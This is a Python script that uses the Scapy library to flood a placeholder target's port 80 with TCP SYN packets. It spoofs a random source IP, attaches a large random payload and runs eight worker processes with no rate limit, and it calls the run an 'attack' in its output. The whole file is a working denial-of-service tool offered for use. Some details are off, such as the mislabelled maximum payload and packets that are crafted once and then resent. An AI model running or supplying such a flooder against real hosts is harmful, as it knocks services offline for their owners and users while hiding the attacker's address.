from scapy.all import conf, IP, TCP, Raw, RandIP
import multiprocessing
import random
import time
from datetime import datetime
import os

TARGET = "Target_IP_Here"  # Replace with the target IP address
WORKERS = 8
PAYLOAD_SIZE = 65495  # Max practical payload for TCP (65,535 - 20 (IP hdr) - 20 (TCP hdr))
RATE_LIMIT = 0.0000

class TCPFlooder:
    def __init__(self):
        # layer 3 raw socket on the default interface.
        self.socket = conf.L3socket(iface=conf.iface)
        self.seq = random.randint(0, 0xFFFF)
    
    def craft_packet(self):
        # random source IP, random source port, TCP SYN flag.
        return (IP(dst=TARGET, src=RandIP(), id=os.getpid() & 0xFFFF) /
                TCP(dport=80, sport=random.randint(1024, 65535), flags="S", seq=(self.seq % 0xFFFF)) /
                Raw(load=os.urandom(PAYLOAD_SIZE)))
    
    def flood(self):
        try:
            pkt = self.craft_packet()
            while True:
                self.socket.send(pkt)
                time.sleep(RATE_LIMIT)
        except Exception as e:
            print(f"Worker error: {str(e)}")

def start_workers():
    workers = []
    for _ in range(WORKERS):
        p = multiprocessing.Process(target=TCPFlooder().flood)
        p.start()
        workers.append(p)
    return workers

if __name__ == "__main__":
    tick=datetime.now()
    print(f"""\n[CONFIG]
Target: {TARGET}
Workers: {WORKERS}
Payload Size: {PAYLOAD_SIZE}B
Theoretical Rate: {round(1 / RATE_LIMIT * WORKERS) if RATE_LIMIT else "Unlimited"} pps
""")
    workers = start_workers()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        tock=datetime.now()
        print(f"[!] Attack started at: {tick.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[!] Attack ended at: {tock.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"\n[!] Attack duration: {tock-tick}")
        print("\n[!] Stopping workers...")
        for w in workers:
            w.terminate()
        print("[+] Test concluded")
